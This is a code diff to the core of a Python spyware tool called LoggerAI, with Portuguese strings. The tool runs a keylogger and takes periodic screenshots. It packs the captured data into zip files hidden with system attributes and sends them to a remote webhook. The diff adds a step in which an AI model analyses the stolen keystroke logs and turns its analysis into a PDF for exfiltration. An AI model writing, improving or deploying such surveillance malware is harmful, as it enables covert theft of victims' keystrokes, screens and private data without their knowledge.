@@ -9,9 +9,10 @@ from datetime import datetime
 import time
 import winreg
 import win32con
+from LoggerAI.agents.exporter import convert_pdf
+from LoggerAI.agents.analyzer import analyze_logs
 from LoggerAI.keylogger import Keylogger
 from LoggerAI.spy import Spy
-from LoggerAI.agent_ai import analyze_logs
 from LoggerAI.webhook_sender import WebhookSender
 
 
@@ -38,16 +39,14 @@ class Core:
         except Exception as e:
             print(f"[Autorun Error] {e}")
 
-    def zip_files(self, txt_filename, zip_filename, content):
+    def zip_files(self, zip_filename, files_to_add):
         """"Função para empacotar os arquivos antes de enviar"""
         try:
-            with open(txt_filename, "w", encoding="utf-8") as f:
-                f.write(content)
-            subprocess.call(["attrib", "+h", "+s", txt_filename])
-
             with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
-                zipf.write(txt_filename)
+                for filename, content in files_to_add.items():
+                    zipf.writestr(filename, content)
             subprocess.call(["attrib", "+h", "+s", zip_filename])
+
         except Exception as e:
             print(f"[Zip Error] {e}")
 
@@ -58,7 +57,7 @@ class Core:
                 zip_path = self.spy.main(
                     duration=interval, interval_seconds=interval_seconds)
                 self.webhook.send_file(
-                    zip_path, "\n📸 Capturas de tela obtidas:"
+                    zip_path, "\n📸 Screenshots obtidas:"
                 )
                 os.remove(zip_path)
             except Exception as e:
@@ -73,24 +72,32 @@ class Core:
                     continue
 
                 timestamp = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
-                raw_txt = f"raw_logs_{timestamp}.txt"
-                raw_zip = f"raw_logs_{timestamp}.zip"
                 log_text = "\n".join(logs)
-                self.zip_files(raw_txt, raw_zip, log_text)
-                self.webhook.send_file(raw_zip, "Logs brutos.")
-                os.remove(raw_txt)
-                os.remove(raw_zip)
+                raw_logs_filename = f"raw_logs_{timestamp}.txt"
 
-                analysis = analyze_logs(logs)
-                analyzed_txt = f"analise_logs_{timestamp}.txt"
-                analyzed_zip = f"analise_logs_{timestamp}.zip"
-                self.zip_files(analyzed_txt, analyzed_zip, analysis)
-                self.webhook.send_file(analyzed_zip, "Logs analisados.")
-                os.remove(analyzed_txt)
-                os.remove(analyzed_zip)
+                raw_zip_filename = f"raw_logs_{timestamp}.zip"
+                self.zip_files(raw_zip_filename, {raw_logs_filename: log_text})
+                self.webhook.send_file(
+                    raw_zip_filename, "Logs brutos capturados:")
+                os.remove(raw_zip_filename)
 
-                # if os.path.exists(logs_file):
-                #     os.remove(logs_file)
+                analysis_text = analyze_logs(logs)
+                pdf_content = convert_pdf(analysis_text)
+
+                analysis_txt_filename = f"analyzed_log{timestamp}.txt"
+                analysis_pdf_filename = f"analyzed_log{timestamp}.pdf"
+                package_zip_filename = f"AI_analyzed_data{timestamp}.zip"
+
+                files_for_package = {
+                    analysis_txt_filename: analysis_text,
+                    analysis_pdf_filename: pdf_content,
+                }
+
+                self.zip_files(package_zip_filename, files_for_package)
+
+                self.webhook.send_file(
+                    package_zip_filename, "Pacote com logs analisados e convertidos pela IA.")
+                os.remove(package_zip_filename)
 
                 self.keylogger.key_log = {}
 
@@ -108,4 +115,4 @@ class Core:
         t2.start()
 
         while True:
-            time.sleep(1)
+            time.sleep(0.5)
